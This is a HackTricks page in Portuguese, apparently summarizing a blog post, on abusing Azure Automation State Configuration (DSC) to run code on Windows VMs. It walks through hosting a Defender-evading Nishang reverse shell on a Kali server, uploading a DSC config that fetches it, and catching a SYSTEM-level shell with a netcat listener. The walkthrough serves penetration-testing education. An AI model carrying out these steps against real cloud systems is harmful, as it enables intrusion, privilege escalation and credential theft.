# Az - State Configuration RCE

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

**Confira o post completo em:** [**https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe**](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)

### Resumo da Prepara√ß√£o e Etapas da Infraestrutura do Servidor Remoto (C2)

#### Vis√£o Geral

O processo envolve a configura√ß√£o de uma infraestrutura de servidor remoto para hospedar um payload modificado do Nishang `Invoke-PowerShellTcp.ps1`, chamado `RevPS.ps1`, projetado para contornar o Windows Defender. O payload √© servido a partir de uma m√°quina Kali Linux com IP `40.84.7.74` usando um simples servidor HTTP em Python. A opera√ß√£o √© executada atrav√©s de v√°rias etapas:

#### Etapa 1 ‚Äî Criar Arquivos

* **Arquivos Necess√°rios:** Dois scripts PowerShell s√£o necess√°rios:
1. `reverse_shell_config.ps1`: Um arquivo de Desired State Configuration (DSC) que busca e executa o payload. Ele pode ser obtido no [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse\_shell\_config.ps1).
2. `push_reverse_shell_config.ps1`: Um script para publicar a configura√ß√£o na VM, dispon√≠vel no [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push\_reverse\_shell\_config.ps1).
* **Personaliza√ß√£o:** Vari√°veis e par√¢metros nesses arquivos devem ser adaptados ao ambiente espec√≠fico do usu√°rio, incluindo nomes de recursos, caminhos de arquivos e identificadores de servidor/payload.

#### Etapa 2 ‚Äî Compactar o Arquivo de Configura√ß√£o

* O `reverse_shell_config.ps1` √© compactado em um arquivo `.zip`, tornando-o pronto para transfer√™ncia para a Conta de Armazenamento do Azure.
```powershell
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```
#### Step 3 ‚Äî Definir Contexto de Armazenamento e Fazer Upload

* O arquivo de configura√ß√£o compactado √© enviado para um cont√™iner de Armazenamento Azure predefinido, azure-pentest, usando o cmdlet Set-AzStorageBlobContent do Azure.
```powershell
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```
#### Step 4 ‚Äî Prep Kali Box

* O servidor Kali baixa o payload RevPS.ps1 de um reposit√≥rio do GitHub.
```bash
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```
* O script √© editado para especificar a VM Windows alvo e a porta para o reverse shell.

#### Step 5 ‚Äî Publish Configuration File

* O arquivo de configura√ß√£o √© executado, resultando na implanta√ß√£o do script de reverse shell no local especificado na VM Windows.

#### Step 6 ‚Äî Host Payload and Setup Listener

* Um Python SimpleHTTPServer √© iniciado para hospedar o payload, junto com um listener Netcat para capturar conex√µes recebidas.
```bash
sudo python -m SimpleHTTPServer 80
sudo nc -nlvp 443
```
* A tarefa agendada executa o payload, alcan√ßando privil√©gios de n√≠vel SYSTEM.

#### Conclus√£o

A execu√ß√£o bem-sucedida deste processo abre in√∫meras possibilidades para a√ß√µes adicionais, como extra√ß√£o de credenciais ou expans√£o do ataque para v√°rias VMs. O guia incentiva a continuidade do aprendizado e a criatividade no √¢mbito do Azure Automation DSC.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
